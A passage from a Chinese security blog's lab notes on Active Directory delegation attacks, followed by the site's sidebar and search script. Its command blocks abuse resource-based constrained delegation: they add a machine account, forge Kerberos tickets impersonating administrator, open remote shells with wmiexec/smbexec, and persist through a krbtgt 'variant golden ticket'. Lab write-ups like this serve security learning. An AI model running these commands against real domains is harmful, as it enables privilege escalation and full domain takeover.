+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test3 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775065217-ab63423c-b00c-494b-8d8d-3672fe5051e4.png" alt="img">然后设置委派</p>
+<p>先查sid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer test3 -Properties objectsid</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775159928-e5adb83b-3e7f-4d8e-898e-f5583553bc87.png" alt="img"></p>
+<p>test3用户的sid为：S-1-5-21-277698542-1653815282-1203866548-1108</p>
+<p>修改WEB1的msds-allowedtoactonbehalfofotheridentity的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-277698542-1653815282-1203866548-1108)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WEB1| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775293314-0add2510-badc-46ab-b97d-fce2e60b161a.png" alt="img"></p>
+<p>然后生成票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 10.1.20.10 test.local/test3\$:123456 -spn cifs/WEB1.test.local -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775620499-3ba24a01-7f0f-40b0-89fa-0c448f879a96.png" alt="img"></p>
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB1.test.local -no-pass -k -dc-ip 10.1.20.10 -codec gb2312</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775677591-4153a0bf-5746-4f05-adf9-1fc962564a5b.png" alt="img"></p>
+<h4 id="利用方式3-打造变种黄金票据"><a href="#利用方式3-打造变种黄金票据" class="headerlink" title="利用方式3 打造变种黄金票据"></a>利用方式3 打造变种黄金票据</h4><p>在获得域控的权限后 对krbtgt用户设置委派属性 来打造黄金票据 进行权限维持</p>
+<p>先创建一个机器账户 test4 123456</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test4 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671777284612-52b31247-7fad-4ef1-8b89-87108ac255fe.png" alt="img"></p>
+<p>然后来到域控上操作</p>
+<p>配置基于资源的约束委派,在powershell中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test4$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671777385300-b57af9a8-de60-4a64-a0a9-7b0530b641d7.png" alt="img"></p>
+<p>现在不管krbtgt的密码 hash怎么变 都不会影响我们打造黄金票据</p>
+<p>申请票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py test.local/test4\$:123456 -spn krbtgt -impersonate administrator -dc-ip 10.1.20.10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671777470924-d838f54c-ff04-4fff-ae10-75af15dd4caf.png" alt="img"></p>
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">python3 smbexec.py -k administrator@DC.test.local -no-pass -dc-ip 10.1.20.10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671777601085-f24a2392-a161-4c40-bf6a-0b326404bf47.png" alt="img"></p>
+<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>使用wmiexec的时候，需要关闭目标防火墙</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+	
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Ax-x
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" title="委派攻击">https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 学习笔记</a>
+          
+            <a href="/tags/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" rel="tag"><i class="fa fa-tag"></i> 委派攻击</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/" rel="next" title="Windows权限维持总结">
+                <i class="fa fa-chevron-left"></i> Windows权限维持总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+		
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+		
+      
+		
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head_portrait.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+		
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ax-x" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">1.</span> <span class="nav-text">域委派</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">2.</span> <span class="nav-text">委派的分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">3.</span> <span class="nav-text">非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C"><span class="nav-number">3.1.</span> <span class="nav-text">实验</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">3.1.1.</span> <span class="nav-text">设置非约束性委派</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F1"><span class="nav-number">3.1.2.</span> <span class="nav-text">利用方式1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F2"><span class="nav-number">3.1.3.</span> <span class="nav-text">利用方式2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.1.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">4.</span> <span class="nav-text">约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C-1"><span class="nav-number">4.1.</span> <span class="nav-text">实验</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F1-1"><span class="nav-number">4.1.1.</span> <span class="nav-text">利用方式1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F2-1"><span class="nav-number">4.1.2.</span> <span class="nav-text">利用方式2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F3"><span class="nav-number">4.1.3.</span> <span class="nav-text">利用方式3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F4"><span class="nav-number">4.1.4.</span> <span class="nav-text">利用方式4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">4.1.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">5.</span> <span class="nav-text">基于资源的约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C-2"><span class="nav-number">5.1.</span> <span class="nav-text">实验</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F1%EF%BC%9A%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.1.</span> <span class="nav-text">利用方式1：基于资源的约束委派攻击本地提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F2-Acount-Operators%E7%BB%84%E7%94%A8%E6%88%B7%E6%8B%BF%E4%B8%8B%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.1.2.</span> <span class="nav-text">利用方式2 Acount Operators组用户拿下主机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F3-%E6%89%93%E9%80%A0%E5%8F%98%E7%A7%8D%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.1.3.</span> <span class="nav-text">利用方式3 打造变种黄金票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">5.1.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ax-x</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">77k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
